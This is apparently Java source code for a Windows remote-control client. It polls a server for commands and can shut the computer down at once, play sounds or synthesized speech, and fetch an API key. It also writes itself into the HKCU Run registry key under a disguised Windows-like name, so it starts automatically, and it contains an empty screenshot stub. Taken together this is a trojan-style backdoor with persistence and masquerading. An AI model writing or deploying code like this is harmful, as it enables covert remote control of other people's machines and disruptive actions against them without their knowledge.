import application.server.Connecter;
import application.server.ServerInformation;
import application.server.SpeechkitAPIKey;
import manager.MusicPlayer;
import manager.speechkitManager.SpeechBuilder;
import manager.speechkitManager.SpeechConnecter;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;

public class Application {



    private static MusicPlayer player;


    private static final String MUSIC_URL = "C:\\Program Files\\WindowsInstanceRunner\\WindowsBeep.wav";

    private static final String SIGNAL_URL = ServerInformation.SERVER_NAME
            + ServerInformation.ON_CHECK_FOR_SIGNAL_OPERATION;

    private static final int TICK_TIME_SIGNAL = 30000;
    private static final int ON_PAUSE_TICK_TIME_SIGNAL = 10000;

    final static Object lock = new Object();
    private static OnPauseCheckerThread onPauseCheckerThread;
    private static SignalCheckerThread signalCheckerThread;
    private static boolean checkingForSignal;
    private static boolean onPauseCheckingForSignal;


    public static void main(String[] args) {
        checkingForSignal = true;
        onPauseCheckingForSignal = false;

        signalCheckerThread = new SignalCheckerThread();
        signalCheckerThread.start();
    }

    private static class SignalCheckerThread extends Thread {
        @Override
        public void run() {
            synchronized (lock) {
                while (checkingForSignal) {
                    signalCheck();

                    try {
                        Thread.sleep(TICK_TIME_SIGNAL);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    private static class OnPauseCheckerThread extends Thread {
        @Override
        public void run() {
            synchronized (lock) {
                while (onPauseCheckingForSignal) {
                    pauseCheck();


                    try {
                        Thread.sleep(ON_PAUSE_TICK_TIME_SIGNAL);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }

                }

            }


        }
    }


    private static void signalCheck() {
        String response = null;
        try {
            response = Connecter.getDataFromURL(SIGNAL_URL);
            System.out.print(response);
        } catch (SocketTimeoutException e) {
            e.printStackTrace();
        }
        if (response != null && (!response.equals(ServerInformation.ANSW_NO_SIGNAL))) {
            resolveResponse(Connecter.parseJSONFromConnection(response, "password"));
            onPauseCheckingForSignal = true;
            checkingForSignal = false;


            onPauseCheckerThread = new OnPauseCheckerThread();
            onPauseCheckerThread.start();
        }
    }

    private static void pauseCheck() {
        String response1 = null;
        try {
            response1 = Connecter.getDataFromURL(SIGNAL_URL);
            System.out.print(response1);
        } catch (SocketTimeoutException e) {
            e.printStackTrace();
        }
        if ((response1 != null) && (response1.equals(ServerInformation.ANSW_NO_SIGNAL))) {
            if (MusicPlayer.isPlaying) {
                player.stopWav();
            }

            checkingForSignal = true;
            onPauseCheckingForSignal = false;
            signalCheckerThread = new SignalCheckerThread();
            signalCheckerThread.start();


        }
    }


    private static void resolveResponse(String response) {

       switch (response) {
           case ServerInformation.ANSW_GET_API_KEY :
               SpeechBuilder.setAPIKey(SpeechkitAPIKey.getAPIKeyFromServer());
               System.out.print(SpeechBuilder.YANDEX_API_SPEECHKIT_KEY);
               break;
           case ServerInformation.ANSW_CLOSE_CMD :
               closeApp();
               break;
           case  ServerInformation.ANSW_SCREEN_CMD :
               getScreenshot();
               break;
           case ServerInformation.ANSW_SHUT_DOWN_CMD :
               shutDown();
               break;
           case ServerInformation.ANSW_ON_MUSIC_CMD :
               playMusic();
               break;
           case ServerInformation.ANSW_FIRST_LAUNCH_AUTO_STARTUP_CMD :
               setToFirstLaunch();
           case "default" :
               break;
           default :
                generateAndPlaySpeech(response);
               break;

       }
    }

    private static void setToFirstLaunch() {
        Runtime runtime = Runtime.getRuntime();
        String cmd = "cmd /c REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"WindowsInstantApp\" /t REG_SZ /F /D \"C:\\Program Files\\WindowsInstanceRunner\\WindowsInstantApp\\WindowsInstantApp.exe\"";
        try {
            Process proc = runtime.exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void closeApp() {
        System.exit(0);
    }

    private static void getScreenshot() {

    }

    private static void shutDown() {
        Runtime runtime = Runtime.getRuntime();
        try {
            Process proc = runtime.exec("shutdown -s -t 0");
        } catch (IOException e) {
            e.printStackTrace();
        }
        System.exit(0);
    }

    private static void playMusic() {
        player = new MusicPlayer();
        player.playWav(MUSIC_URL);
    }

    private static void generateAndPlaySpeech(String url) {
        try {
            SpeechConnecter.playSpeechFromURL(SpeechBuilder.generateSpeechLink(url));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
}
